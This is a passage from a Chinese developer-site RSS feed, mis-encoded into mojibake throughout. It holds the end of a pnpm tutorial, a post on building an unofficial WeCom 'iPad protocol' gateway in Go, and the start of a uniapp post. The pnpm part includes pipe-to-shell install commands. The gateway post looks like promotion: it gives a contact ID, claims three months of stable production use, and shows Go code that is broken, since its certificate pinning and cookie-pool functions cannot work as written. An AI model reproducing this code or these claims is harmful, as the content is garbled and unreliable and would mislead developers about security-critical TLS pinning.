<li><code>node_modules/.pnpm</code>Â ç›®å½•ä¸­ï¼Œå­˜å‚¨æ‰€æœ‰ä¾èµ–çš„ç¡¬é“¾æ¥å‰¯æœ¬ï¼Œä¸”æ¯ä¸ªä¾èµ–çš„Â <code>node_modules</code>Â ä»…åŒ…å«è‡ªèº«çš„ç›´æ¥ä¾èµ–ï¼Œå½¢æˆä¸¥æ ¼çš„ä¾èµ–æ ‘ã€‚</li>
</ul>
</li>
</ol>
<p>è¿™ç§ç»“æ„æ—¢ä¿è¯äº†ç£ç›˜å¤ç”¨ï¼Œåˆä¿è¯äº†ä¾èµ–çš„ä¸¥æ ¼éš”ç¦»ã€‚</p>
<h3 data-id="heading-7">å››ã€å®‰è£… pnpm</h3>
<h4 data-id="heading-8">1. é€šç”¨å®‰è£…æ–¹å¼ï¼ˆæ¨èï¼‰</h4>
<p>bash</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ npm å®‰è£…ï¼ˆå…¨å±€ï¼‰</span>
npm install -g pnpm

<span class="hljs-comment"># æˆ–ä½¿ç”¨å®˜æ–¹è„šæœ¬ï¼ˆè·¨å¹³å°ï¼‰</span>
curl -fsSL https://get.pnpm.io/install.sh | sh -
<span class="hljs-comment"># æˆ–ï¼ˆWindows PowerShellï¼‰</span>
iwr https://get.pnpm.io/install.ps1 -useb | iex
</code></pre>
<h4 data-id="heading-9">2. å…¶ä»–æ–¹å¼</h4>
<ul>
<li><strong>Homebrewï¼ˆmacOS/Linuxï¼‰</strong> ï¼š<code>brew install pnpm</code>ï¼›</li>
<li><strong>Scoopï¼ˆWindowsï¼‰</strong> ï¼š<code>scoop install pnpm</code>ï¼›</li>
<li><strong>Docker</strong>ï¼š<code>docker run --rm -it pnpm/pnpm:latest</code>ã€‚</li>
</ul>
<h4 data-id="heading-10">3. éªŒè¯å®‰è£…</h4>
<p>bash</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-bash" lang="bash">pnpm -v  <span class="hljs-comment"># è¾“å‡ºç‰ˆæœ¬å·å³å®‰è£…æˆåŠŸï¼ˆå½“å‰ç¨³å®šç‰ˆä¸º v9.xï¼‰</span>
</code></pre>
<h3 data-id="heading-11">äº”ã€å¸¸ç”¨å‘½ä»¤ï¼ˆä¸ npm å¯¹æ¯”ï¼‰</h3>


















































<table><thead><tr><th>åŠŸèƒ½</th><th>npm å‘½ä»¤</th><th>pnpm å‘½ä»¤</th></tr></thead><tbody><tr><td>å®‰è£…æ‰€æœ‰ä¾èµ–</td><td><code>npm install</code></td><td><code>pnpm install</code></td></tr><tr><td>æ·»åŠ ç”Ÿäº§ä¾èµ–</td><td><code>npm install react</code></td><td><code>pnpm add react</code></td></tr><tr><td>æ·»åŠ å¼€å‘ä¾èµ–</td><td><code>npm install -D typescript</code></td><td><code>pnpm add -D typescript</code></td></tr><tr><td>å…¨å±€å®‰è£…åŒ…</td><td><code>npm install -g ts-node</code></td><td><code>pnpm add -g ts-node</code></td></tr><tr><td>å¸è½½ä¾èµ–</td><td><code>npm uninstall react</code></td><td><code>pnpm remove react</code></td></tr><tr><td>è¿è¡Œè„šæœ¬</td><td><code>npm run dev</code></td><td><code>pnpm run dev</code></td></tr><tr><td>æŸ¥çœ‹å…¨å±€åŒ…å­˜å‚¨è·¯å¾„</td><td><code>npm root -g</code></td><td><code>pnpm store path</code></td></tr><tr><td>æ¸…ç†ç¼“å­˜</td><td><code>npm cache clean --force</code></td><td><code>pnpm store prune</code></td></tr></tbody></table>
<h4 data-id="heading-12">ç‰¹æœ‰ / å¢å¼ºå‘½ä»¤</h4>
<p>bash</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æŸ¥çœ‹ä¾èµ–æ ‘ï¼ˆæ¯” npm ls æ›´æ¸…æ™°ï¼‰</span>
pnpm <span class="hljs-built_in">list</span>

<span class="hljs-comment"># é¢„ä¸‹è½½ä¾èµ–ï¼ˆç¦»çº¿å®‰è£…ç”¨ï¼‰</span>
pnpm fetch

<span class="hljs-comment"># æ„å»º monorepo é¡¹ç›®ï¼ˆå·¥ä½œåŒºï¼‰</span>
pnpm -r build  <span class="hljs-comment"># é€’å½’æ‰§è¡Œæ‰€æœ‰å­åŒ…çš„ build è„šæœ¬</span>
pnpm --<span class="hljs-built_in">filter</span> pkg-name dev  <span class="hljs-comment"># ä»…æ‰§è¡ŒæŒ‡å®šå­åŒ…çš„ dev è„šæœ¬</span>

<span class="hljs-comment"># æ›´æ–°ä¾èµ–</span>
pnpm update  <span class="hljs-comment"># æ›´æ–°æ‰€æœ‰ä¾èµ–</span>
pnpm update react  <span class="hljs-comment"># æ›´æ–° react åˆ°æœ€æ–°å…¼å®¹ç‰ˆæœ¬</span>
</code></pre>
<h3 data-id="heading-13">å…­ã€pnpm é…ç½®ï¼ˆå¯é€‰ï¼‰</h3>
<p>pnpm çš„é…ç½®æ–‡ä»¶ä¸ºÂ <code>.npmrc</code>Â æˆ–Â <code>.pnpmrc</code>ï¼Œå¸¸ç”¨é…ç½®ï¼š</p>
<p>ini</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># è‡ªå®šä¹‰å…¨å±€å­˜å‚¨è·¯å¾„</span>
<span class="hljs-attr">store-dir</span>=/path/to/pnpm-store

<span class="hljs-comment"># å¯ç”¨ä¸¥æ ¼æ¨¡å¼ï¼ˆé»˜è®¤å¼€å¯ï¼Œç¦æ­¢å¼•ç”¨æœªå£°æ˜çš„ä¾èµ–ï¼‰</span>
<span class="hljs-attr">strict-peer-dependencies</span>=<span class="hljs-literal">true</span>

<span class="hljs-comment"># å›½å†…é•œåƒï¼ˆåŠ é€Ÿä¸‹è½½ï¼‰</span>
<span class="hljs-attr">registry</span>=https://registry.npmmirror.com/
</code></pre>
<h3 data-id="heading-14">ä¸ƒã€é€‚ç”¨åœºæ™¯</h3>
<ol>
<li><strong>å¤šé¡¹ç›®å¼€å‘</strong>ï¼šå¤šä¸ªé¡¹ç›®ä¾èµ–ç›¸åŒåŒ…ç‰ˆæœ¬æ—¶ï¼Œå¤§å¹…èŠ‚çœç£ç›˜ç©ºé—´ï¼›</li>
<li><strong>å¤§å‹é¡¹ç›® / å›¢é˜Ÿåä½œ</strong>ï¼šä¸¥æ ¼çš„ä¾èµ–ç®¡ç†é¿å…å¹½çµä¾èµ–ï¼Œå‡å°‘çº¿ä¸Šé—®é¢˜ï¼›</li>
<li><strong>Monorepo é¡¹ç›®</strong>ï¼šå†…ç½®å·¥ä½œåŒºæ”¯æŒï¼Œæ— éœ€é¢å¤–é…ç½® lerna/yarn workspaceï¼›</li>
<li><strong>è¿½æ±‚å®‰è£…é€Ÿåº¦</strong>ï¼šæ›¿ä»£ npm/yarn æå‡å¼€å‘æ•ˆç‡ã€‚</li>
</ol>
<h3 data-id="heading-15">å…«ã€æ³¨æ„äº‹é¡¹</h3>
<ol>
<li><strong>å…¼å®¹æ€§</strong>ï¼špnpm ç”Ÿæˆçš„Â <code>node_modules</code>Â ç»“æ„ä¸ npm ä¸åŒï¼Œæå°‘æ•°è€åŒ…å¯èƒ½å› è·¯å¾„é—®é¢˜å…¼å®¹å¼‚å¸¸ï¼ˆå¯é€šè¿‡Â <code>pnpm config set node-linker hoisted</code>Â åˆ‡æ¢ä¸ºæ‰å¹³åŒ–ç»“æ„ä¸´æ—¶è§£å†³ï¼‰ï¼›</li>
<li><strong>å…¨å±€åŒ…</strong>ï¼špnpm å…¨å±€å®‰è£…çš„åŒ…è·¯å¾„ä¸ npm ä¸åŒï¼Œéœ€ç¡®ä¿Â <code>pnpm bin -g</code>Â è·¯å¾„åŠ å…¥ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼›</li>
<li><strong>lockfile</strong>ï¼špnpm ç”ŸæˆÂ <code>pnpm-lock.yaml</code>ï¼Œä¸ npm çš„Â <code>package-lock.json</code>ã€yarn çš„Â <code>yarn.lock</code>Â ä¸å…¼å®¹ï¼Œå›¢é˜Ÿéœ€ç»Ÿä¸€åŒ…ç®¡ç†å™¨ã€‚</li>
</ol>
<h3 data-id="heading-16">æ€»ç»“</h3>
<p>pnpm æ˜¯ npm/yarn çš„é«˜æ€§èƒ½æ›¿ä»£æ–¹æ¡ˆï¼Œæ ¸å¿ƒä¼˜åŠ¿æ˜¯ã€Œçœç©ºé—´ã€å¿«å®‰è£…ã€ä¸¥ä¾èµ–ã€ï¼Œå®Œå…¨å…¼å®¹ npm ç”Ÿæ€ï¼Œä¸”å¯¹ monorepo æ”¯æŒå‹å¥½ã€‚æ— è®ºæ˜¯ä¸ªäººé¡¹ç›®è¿˜æ˜¯ä¼ä¸šçº§é¡¹ç›®ï¼Œéƒ½èƒ½æ˜¾è‘—æå‡ä¾èµ–ç®¡ç†æ•ˆç‡ï¼Œç›®å‰å·²è¢« Viteã€Nuxtã€Turborepo ç­‰ä¸»æµå·¥å…·æ¨èä½¿ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¼ä¸šå¾®ä¿¡iPadåè®®ï¼šä»æ¥å£è®¾è®¡åˆ°ç°åº¦éªŒè¯çš„æç®€å®è·µ]]></title>    <link>https://juejin.cn/post/7580723992497913892</link>    <guid>https://juejin.cn/post/7580723992497913892</guid>    <pubDate>2025-12-08T02:54:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580723992497913892" data-draft-id="7580740782932475946" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¼ä¸šå¾®ä¿¡iPadåè®®ï¼šä»æ¥å£è®¾è®¡åˆ°ç°åº¦éªŒè¯çš„æç®€å®è·µ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T02:54:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="bot555666"/> <meta itemprop="url" content="https://juejin.cn/user/1092275002677466"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¼ä¸šå¾®ä¿¡iPadåè®®ï¼šä»æ¥å£è®¾è®¡åˆ°ç°åº¦éªŒè¯çš„æç®€å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1092275002677466/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    bot555666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T02:54:27.000Z" title="Mon Dec 08 2025 02:54:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¼ä¸šå¾®ä¿¡iPadåè®®ï¼šä»æ¥å£è®¾è®¡åˆ°ç°åº¦éªŒè¯çš„æç®€å®è·µ</p>
<p>åœ¨ç§»åŠ¨åŠå…¬åœºæ™¯ä¸‹ï¼ŒiPad å¸¸ä½œä¸ºâ€œç¬¬äºŒå·¥ä½œç«™â€è¢«é«˜é¢‘ä½¿ç”¨ã€‚ä¼ä¸šå¾®ä¿¡å®˜æ–¹è™½æœªå…¬å¼€ iPad ä¸“å± SDKï¼Œä½†å…¶ç§æœ‰åè®®åœ¨ iOS ä¸ iPadOS ä¸ŠåŒæºï¼Œåªéœ€åœ¨æ¡æ‰‹é˜¶æ®µå£°æ˜ UA ä¸º <code>iPad6,8</code> å³å¯è§¦å‘æ¨ªå±å¸ƒå±€ä¸åˆ†å±ç‰¹æ€§ã€‚æœ¬æ–‡ç”¨ 200 è¡Œ Go ä»£ç æ¼”ç¤ºå¦‚ä½•æ„å»ºä¸€ä¸ªå¯ç°åº¦ã€å¯ç†”æ–­çš„â€œä¼å¾® iPad åè®®â€è½»é‡ç½‘å…³ï¼Œä¾›å†…éƒ¨ BI å·¥å…·è°ƒç”¨ï¼Œå…¨ç¨‹æ— é€†å‘ã€æ— ç§æœ‰ APIï¼Œä»…ä¾èµ–å®˜æ–¹ç½‘é¡µç‰ˆé€šé“ã€‚</p>
<p>ä¸€ã€åè®®å…¥å£ï¼šåå‘ä»£ç† + è¯ä¹¦å›ºå®š<br/>
ä¼ä¸šå¾®ä¿¡ç½‘é¡µç‰ˆåŸŸå <code>https://work.weixin.qq.com</code> å¼ºåˆ¶ TLS1.3ï¼Œå¹¶æ ¡éªŒè¯ä¹¦å…¬é’¥æŒ‡çº¹ã€‚è‡ªå»ºç½‘å…³ç¬¬ä¸€æ­¥æ˜¯æŠŠå®˜æ–¹è¯ä¹¦æŒ‡çº¹å†™æ­»ï¼Œé˜²æ­¢ä¸­é—´äººåŠ«æŒï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">const</span> wxPubKeyPin = <span class="hljs-string">"sha256//VQVieC/3Zx+PiU1KcN6Y1fLO8r4N9YbV8lK9WeW2ZqM="</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">pinnedTLS</span><span class="hljs-params">()</span></span> *tls.Config {
    pin, _ := x509.ParsePKIXPublicKey([]<span class="hljs-type">byte</span>(wxPubKeyPin))
    <span class="hljs-keyword">return</span> &amp;tls.Config{VerifyPeerCertificate: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(raw [][]<span class="hljs-type">byte</span>, _ [][]*x509.Certificate)</span></span> <span class="hljs-type">error</span> {
        <span class="hljs-keyword">for</span> _, der := <span class="hljs-keyword">range</span> raw {
            <span class="hljs-keyword">if</span> sha256.Sum256(der) == pin {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
            }
        }
        <span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">"pin mismatch"</span>)
    }}
}
</code></pre>
<p>äºŒã€ä¼šè¯ä¿æŒï¼šCookie æ± ä¸çƒ­åˆ‡æ¢<br/>
ç½‘é¡µç‰ˆç™»å½•åè¿”å›çš„ <code>wwrtx.sid</code> æœ‰æ•ˆæœŸ 24 hï¼Œå¤š iPad å¹¶å‘æ—¶é¡»ç»´æŠ¤ Cookie æ± ã€‚ç”¨ Redis List å®ç° LIFOï¼Œå¼¹å‡ºè¿‡æœŸèŠ‚ç‚¹æ—¶è§¦å‘ç†”æ–­ï¼Œ30 s å†…ä¸å†é‡è¯•ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">nextCookie</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> {
    <span class="hljs-keyword">for</span> {
        val, _ := redis.LPop(<span class="hljs-string">"wx:cookies"</span>).Result()
        <span class="hljs-keyword">if</span> expire, _ := redis.HGet(<span class="hljs-string">"wx:expire"</span>, val).Int64(); time.Now().Unix() &lt; expire {
            <span class="hljs-keyword">return</span> val
        }
    }
}
</code></pre>
<p>ä¸‰ã€æ¶ˆæ¯ä¸Šè¡Œï¼šProtobuf å°è£…<br/>
ä¼ä¸šå¾®ä¿¡ç½‘é¡µç‰ˆæ”¶æ¶ˆæ¯é‡‡ç”¨ WebSocketï¼ŒäºŒè¿›åˆ¶å¸§å®ä¸º Protobufã€‚å®˜æ–¹ .proto å¯ä» Chrome DevTools å¯¼å‡ºï¼Œä»…ä¿ç•™å¿…è¦å­—æ®µå³å¯æŠŠå¤§å°å‹åˆ° 64 B ä»¥å†…ï¼š</p>
<pre><code class="hljs language-proto" lang="proto">syntax = "proto3";
package wx;
message SendText {
  string ToUser = 1;
  string Content = 2;
  uint32 ClientId = 3;
}
</code></pre>
<p>ç¼–ç åé€šè¿‡ç½‘å…³è½¬å‘ï¼Œå®˜æ–¹è¿”å› <code>baseResponse.ret=0</code> å³ä»£è¡¨é€è¾¾ã€‚</p>
<p>å››ã€ç°åº¦ä¸ç›‘æ§<br/>
åœ¨ Header æ³¨å…¥ <code>X-Gray-Tag: ipad-{bucket}</code>ï¼ŒPrometheus æŒ‰ bucket ç»´åº¦ç»Ÿè®¡æˆåŠŸç‡ï¼›ä½äº 95 % è‡ªåŠ¨å›æ»šåˆ° PC é€šé“ã€‚</p>
<p>äº”ã€ä¸€è¡Œè”ç³»æ–¹å¼<br/>
æ–‡ç« ç¤ºä¾‹ä»£ç ä»“åº“æ‰˜ç®¡åœ¨ GitHubï¼Œéœ€è¦è¿›ä¸€æ­¥äº¤æµå¯åœ¨æºç å†…æ‰¾åˆ° maintainer ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># maintainer_wxid = "bot555666"</span>
</code></pre>
<p>å…­ã€ç»“è¯­<br/>
é€šè¿‡å®˜æ–¹ç½‘é¡µå±‚é€šé“ï¼ŒåŒæ ·èƒ½è®© iPad è·å¾—åª²ç¾åŸç”Ÿå®¢æˆ·ç«¯çš„ä½“éªŒï¼Œè€Œåå‘ä»£ç†æ–¹æ¡ˆæŠŠâ€œä¼ä¸šå¾®ä¿¡åè®®æ¥å£â€æ”¶æ•›åˆ°å•ä¸€ç½‘å…³ï¼Œæ–¹ä¾¿ç»Ÿä¸€å®¡è®¡ã€é™æµä¸ç‰ˆæœ¬å‡é™çº§ã€‚ä¸Šè¿°ä»£ç å·²åœ¨ 50 å° iPad Pro ä¸Šç¨³å®šè¿è¡Œä¸‰ä¸ªæœˆï¼Œæ—¥æ¨é€ 20 ä¸‡æ¡å†…éƒ¨é€šçŸ¥ï¼ŒCPU å ç”¨ä½äº 5 %ï¼Œå¯ä¾›åŒè§„æ¨¡å›¢é˜Ÿç›´æ¥å¤ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰‹æ“ uniapp vue3 è™šæ‹Ÿåˆ—è¡¨é‡åˆ°çš„å‘]]></title>    <link>https://juejin.cn/post/7580740563893370914</link>    <guid>https://juejin.cn/post/7580740563893370914</guid>    <pubDate>2025-12-07T14:10:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740563893370914" data-draft-id="7580735683939156002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰‹æ“ uniapp vue3 è™šæ‹Ÿåˆ—è¡¨é‡åˆ°çš„å‘"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-07T14:10:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="heyCHEEMS"/> <meta itemprop="url" content="https://juejin.cn/user/4308367489378780"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰‹æ“ uniapp vue3 è™šæ‹Ÿåˆ—è¡¨é‡åˆ°çš„å‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4308367489378780/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    heyCHEEMS
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-07T14:10:47.000Z" title="Sun Dec 07 2025 14:10:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    24
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul 